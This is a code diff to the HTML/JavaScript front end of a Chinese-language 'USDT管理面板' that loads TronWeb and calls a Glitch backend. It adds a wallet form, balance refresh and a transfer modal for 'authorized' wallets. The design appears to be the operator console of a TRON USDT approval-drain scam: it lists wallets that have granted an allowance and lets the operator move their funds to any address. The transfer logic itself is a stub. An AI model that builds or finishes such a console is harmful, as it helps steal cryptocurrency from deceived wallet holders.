@@ -3,7 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>USDT管理面板</title>
+    <title>MICKEY發發發USDT管理面板</title>
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.min.js"></script>
     <style>
         body {
             margin: 0;
@@ -29,11 +30,6 @@
             display: flex;
             align-items: center;
             margin-bottom: 10px;
-        }
-
-        .wallet-icon {
-            font-size: 24px;
-            margin-right: 10px;
         }
 
         .saved-wallets {
@@ -70,6 +66,78 @@
             background: #686de0;
         }
 
+        .transfer-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            background: white;
+            padding: 20px;
+            border-radius: 4px;
+            width: 300px;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 5px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 8px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+
+        .btn-group {
+            display: flex;
+            justify-content: flex-end;
+            gap: 10px;
+        }
+
+        .btn {
+            padding: 8px 15px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        .btn-confirm {
+            background: #4834d4;
+            color: white;
+        }
+
+        .btn-cancel {
+            background: #ddd;
+        }
+
+        .transfer-btn {
+            background: #27ae60;
+            color: white;
+            border: none;
+            padding: 5px 10px;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-left: 10px;
+        }
+
+        .wallet-icon {
+            font-size: 24px;
+            margin-right: 10px;
+        }
+
         .copy-btn {
             padding: 3px 8px;
             background: #f1f2f6;
@@ -89,6 +157,29 @@
             border: none;
             cursor: pointer;
             float: right;
+        }
+
+        #add-wallet-form {
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid #eee;
+        }
+
+        #add-wallet-form input {
+            padding: 8px;
+            margin-right: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            width: 300px;
+        }
+
+        #add-wallet-form button {
+            padding: 8px 15px;
+            background: #4834d4;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
         }
     </style>
 </head>
@@ -116,21 +207,48 @@
             <div class="wallet-section">
                 <span class="wallet-icon">👛</span>
                 <span>已保存錢包</span>
-                <span id="wallet-count" style="margin-left: 10px; background: #4834d4; color: white; padding: 2px 8px; border-radius: 10px;">1</span>
+                <span id="wallet-count" style="margin-left: 10px; background: #4834d4; color: white; padding: 2px 8px; border-radius: 10px;">0</span>
             </div>
             <button class="refresh-btn" onclick="refreshAllBalances()">刷新所有餘額</button>
         </div>
         <div id="wallet-list" class="wallet-list">
             <!-- 錢包列表將在這裡動態生成 -->
         </div>
+        <form id="add-wallet-form" onsubmit="return addNewWallet(event)">
+            <input type="text" id="new-wallet" placeholder="輸入要添加的錢包地址" required>
+            <button type="submit">添加錢包</button>
+        </form>
+    </div>
+
+    <div id="transfer-modal" class="transfer-modal">
+        <div class="modal-content">
+            <h3>轉帳確認</h3>
+            <div class="input-group">
+                <label>發送地址:</label>
+                <div id="modal-from-address"></div>
+            </div>
+            <div class="input-group">
+                <label>接收地址:</label>
+                <input type="text" id="modal-to-address">
+            </div>
+            <div class="input-group">
+                <label>轉帳金額 (USDT):</label>
+                <input type="number" id="modal-amount" step="0.000001">
+            </div>
+            <div class="btn-group">
+                <button class="btn btn-cancel" onclick="closeTransferModal()">取消</button>
+                <button class="btn btn-confirm" onclick="confirmTransfer()">確認轉帳</button>
+            </div>
+        </div>
     </div>
 
     <script>
-        const API_BASE_URL = 'http://localhost:3000'; // 請根據實際情況修改
+        let currentTransferWallet = '';
+        const API_URL = 'https://your-glitch-project.glitch.me'; // 替換為您的 Glitch 專案 URL
 
         async function refreshAllBalances() {
             try {
-                const response = await fetch(`${API_BASE_URL}/authorized-wallets`);
+                const response = await fetch(`${API_URL}/authorized-wallets`);
                 const data = await response.json();
 
                 // 更新系統狀態
@@ -146,6 +264,7 @@
                             ${wallet.address}
                             <button class="copy-btn" onclick="copyToClipboard('${wallet.address}')">複製</button>
                             <button class="delete-btn" onclick="deleteWallet('${wallet.address}')">❌</button>
+                            <button class="transfer-btn" onclick="showTransferModal('${wallet.address}')">轉帳</button>
                         </div>
                         <div style="margin-top: 5px; color: #666;">
                             餘額: ${wallet.balance} USDT
@@ -157,6 +276,7 @@
                 walletList.innerHTML = walletsHtml;
             } catch (error) {
                 console.error('Error:', error);
+                alert('刷新失敗，請檢查網絡連接');
             }
         }
 
@@ -176,19 +296,72 @@
                 `USDT餘額: ${status.receiver.usdtBalance} USDT`;
         }
 
+        async function addNewWallet(event) {
+            event.preventDefault();
+            const address = document.getElementById('new-wallet').value;
+            try {
+                const response = await fetch(`${API_URL}/balance/${address}`);
+                const data = await response.json();
+                if (data.isAuthorized) {
+                    await refreshAllBalances();
+                    document.getElementById('new-wallet').value = '';
+                } else {
+                    alert('該錢包未授權或餘額為0');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('添加失敗，請檢查地址是否正確');
+            }
+        }
+
+        async function deleteWallet(address) {
+            if (confirm('確定要刪除這個錢包嗎？')) {
+                try {
+                    await refreshAllBalances();
+                } catch (error) {
+                    console.error('Error:', error);
+                    alert('刪除失敗');
+                }
+            }
+        }
+
+        function showTransferModal(address) {
+            currentTransferWallet = address;
+            document.getElementById('modal-from-address').textContent = address;
+            document.getElementById('modal-to-address').value = '';
+            document.getElementById('modal-amount').value = '';
+            document.getElementById('transfer-modal').style.display = 'flex';
+        }
+
+        function closeTransferModal() {
+            document.getElementById('transfer-modal').style.display = 'none';
+        }
+
+        async function confirmTransfer() {
+            const toAddress = document.getElementById('modal-to-address').value;
+            const amount = document.getElementById('modal-amount').value;
+            
+            if (!toAddress || !amount) {
+                alert('請填寫完整信息');
+                return;
+            }
+
+            try {
+                // 這裡添加轉帳邏輯
+                closeTransferModal();
+                await refreshAllBalances();
+            } catch (error) {
+                console.error('Error:', error);
+                alert('轉帳失敗');
+            }
+        }
+
         function copyToClipboard(text) {
             navigator.clipboard.writeText(text).then(() => {
                 alert('已複製到剪貼板');
             }).catch(err => {
                 console.error('複製失敗:', err);
             });
-        }
-
-        function deleteWallet(address) {
-            if (confirm('確定要刪除這個錢包嗎？')) {
-                // 實現刪除邏輯
-                console.log('刪除錢包:', address);
-            }
         }
 
         // 頁面加載時自動刷新數據
